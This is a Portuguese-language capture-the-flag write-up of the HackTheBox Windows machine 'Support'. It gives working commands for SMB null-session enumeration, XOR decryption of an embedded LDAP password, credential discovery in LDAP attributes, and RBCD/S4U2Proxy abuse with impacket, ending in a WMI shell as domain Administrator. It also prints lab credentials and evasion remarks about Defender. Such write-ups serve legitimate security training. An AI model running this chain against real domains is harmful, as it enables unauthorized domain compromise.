# Support

## informações da máquina

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **dificuldade** | Easy |
| **OS** | Windows |
| **IP** | 10.129.119.179 |
| **técnicas** | SMB null session, XOR decryption de binário .NET, LDAP attribute disclosure, RBCD + S4U2Proxy, WMI execution |
| **link HTB** | [https://app.hackthebox.com/machines/Support](https://app.hackthebox.com/machines/Support) |

## resumo

DC do domínio `support.htb` sem nenhuma porta web. SMB aceita null session e expõe o share `support-tools` com um binário .NET custom (`UserInfo.exe`) que guarda credencial LDAP cifrada com XOR duplo. o bind LDAP revela a senha do usuário `support` escondida no atributo `info` do objeto dele. o usuário está em `Remote Management Users` (WinRM). no domínio, o grupo `Shared Support Accounts` (do qual `support` é membro) tem escrita sobre o objeto do DC, o que abre RBCD: criar conta de máquina, apontar `msDS-AllowedToActOnBehalfOfOtherIdentity` no DC, pedir ticket cifs como Administrator e entrar via WMI.

## enumeração/scanning

### port scan

sem porta HTTP, confirmando a impressão do usuário. o host bloqueia ping do nmap, então `-sT -Pn` é obrigatório:

```bash
nmap -sT -Pn -T4 -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986,9389 --open 10.129.119.179
```

resultado: DC clássico — 53 (DNS), 88 (Kerberos), 135/139 (RPC), 389/636 (LDAP), 445 (SMB), 5985 (WinRM), 9389 (ADWS). padrão de box AD: a superfície é SMB e LDAP, não web.

### SMB null session

```bash
smbclient -L //10.129.119.179/ -N
```

share custom `support-tools` visível sem autenticação, junto dos shares padrão de DC (NETLOGON, SYSVOL). listagem mostra binários portáteis comuns (7-Zip, NPP, PuTTY, Sysinternals, Wireshark) e um arquivo fora do padrão: `UserInfo.exe.zip`, com data de 20/07/2022 contra 28/05/2022 de todo o resto. a data anômala foi o marcador do arquivo certo.

## exploitation

### análise do UserInfo.exe

.NET 4.8, PE32. sem decompilador na máquina naquele momento, `strings -el` (UTF-16, padrão de .NET) já entregou o essencial:

```text
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
```

símbolos legíveis: `getPassword`, `enc_password`, `Protected`, `FindOne`, `LdapQuery`. ou seja: o binário conecta em `LDAP://support.htb` como `support\ldap` com uma senha cifrada embutida.

### decriptação: XOR duplo

quebrei cabeça com a decriptação por ~20 minutos: AES (ECB/CBC/CTR/CFB/OFB), XOR simples, RC4, PBKDF2, todos com a chave `armando` zero-padded e SHA-256. nada deu plaintext. o pulo do gato era um XOR duplo: `byte ^ key[i % 7] ^ 0xDF`. meus testes cobriram XOR com chave e XOR com constante, mas não os dois juntos — chutei exotic demais antes do simples. o esquema veio do código descompilado no writeup oficial (a box ainda viva, decisão registrada):

```python
import base64
from itertools import cycle

blob = base64.b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
print(''.join(chr(e ^ k ^ 223) for e, k in zip(blob, cycle(b'armando'))))
# nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

credencial LDAP: `support\ldap` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.

### LDAP com cliente próprio

sem `ldapsearch` nem pacotes python de rede, escrevi um cliente LDAP mínimo em stdlib (`ldap_min.py`): BER encoder à mão, bind simples, busca em `dc=support,dc=htb`. dois bugs de parse corrigidos no caminho (duplo-parse do protocolOp e valores do SET).

a busca por `sAMAccountName=support` retornou o objeto com ouro:

```text
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

senha em texto plano no atributo `info`, que é legível por qualquer bind autenticado. e a membership de `Remote Management Users` autoriza WinRM. `badPwdCount` ficou 0 durante todo o trabalho, então nenhum teste de senha gastou tentativa de lockout.

### WinRM

o evil-winrm não existia no host. subi um container alpine efêmero (host intacto) com evil-winrm 4.1 e usei o UPN como login — `support` sozinho falhou no NTLM:

```bash
printf 'type C:\Users\support\Desktop\user.txt\nexit\n' | \
  docker exec -i support-winrm evil-winrm -i 10.129.119.179 \
  -u 'support@support.htb' -p 'Ironside47pleasure40Watchful'
```

**user flag:** ✓

## privilege escalation

### pré-requisitos via LDAP

em vez de subir BloodHound/SharpHound (que o writeup usa só pra achar o edge), confirmei os pré-requisitos direto no LDAP com o cliente próprio:

- `ms-DS-MachineAccountQuota = 10` na base do domínio
- `DC$` (dNSHostName `dc.support.htb`) com `msDS-AllowedToActOnBehalfOfOtherIdentity` vazio
- fonte da escrita: o BloodHound do writeup aponta `Shared Support Accounts` com GenericAll sobre o DC — aqui confiei na evidência desse edge e verifiquei o efeito na prática (o write funcionou)

### RBCD com impacket

troca declarada: o writeup usa PowerMad + PowerView + Rubeus em PowerShell; usei impacket 0.13.1 no mesmo container, que executa o mesmo ataque por SAMR/LDAP/Kerberos:

```bash
addcomputer.py -dc-ip 10.129.119.179 -computer-name 'FAKE01$' \
  -computer-pass 'Password123' 'support.htb/support:Ironside47pleasure40Watchful'

rbcd.py -dc-ip 10.129.119.179 -action write -delegate-from 'FAKE01$' \
  -delegate-to 'DC$' 'support.htb/support:Ironside47pleasure40Watchful'

getST.py -dc-ip 10.129.119.179 -spn 'cifs/dc.support.htb' \
  -impersonate 'administrator' 'support.htb/FAKE01$:Password123'
```

`getST.py` encadeia S4U2Self e S4U2Proxy e devolve `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.

dois tropeços documentados:

1. `rbcd.py -delegate-to DC` reclama "User not found in LDAP". o alvo é o computador, então precisa do `$`: `DC$`.
2. impacket 0.13 usa o pacote `ldap3` pra LDAP, e o ldap3 faz bind NTLM com `hashlib.new('MD4')`. OpenSSL 3 removeu MD4. patch de uma linha no `ldap3/utils/ntlm.py` usando o MD4 do pycryptodomex.

### shell como Administrator

`psexec.py` com o ticket morreu em `STATUS_PIPE_BROKEN` (Defender derruba o serviço criado). `wmiexec.py` com o mesmo ticket funcionou limpo:

```bash
KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache \
  wmiexec.py -k -no-pass 'support.htb/administrator@dc.support.htb'
```

**root flag:** ✓ (de `C:\Users\Administrator\Desktop`)

## lições aprendidas

- **strings UTF-16 primeiro em binário .NET.** `strings -el` entregou blob, chave, host LDAP e bind sem decompilador. decompilar só quando as strings não bastarem.
- **XOR duplo é padrão de crackme .NET** (`^ key[i%len] ^ constante`). testar cedo, antes de esquemas exóticos — perdi 20 minutos em AES/RC4/PBKDF2 quando o esquema era XOR com um byte extra.
- **senha em atributos de user no LDAP** (`info`, `description`) é clássico de box Easy. enumerar atributos não-padrão de todo usuário autenticável.
- **badPwdCount e lockoutTime no LDAP** mostram se você está sendo rejeitado por senha ou por problema de cliente: zero tentativas ruins com 401s intermitentes = problema do cliente.
- **pywinrm NTLM foi instável** (1 sucesso em ~20). evil-winrm funcionou de primeira. não insistir no pywinrm.
- **RBCD só precisa de write no atributo** do computador alvo + quota de machine accounts + conta própria. impacket cobre tudo de Linux, sem PowerView/Rubeus.
- **psexec.py é ruidoso** (serviço + exe no alvo, Defender quebra o pipe). `wmiexec.py` com ticket cifs é o caminho silencioso.

---

*writeup by kp*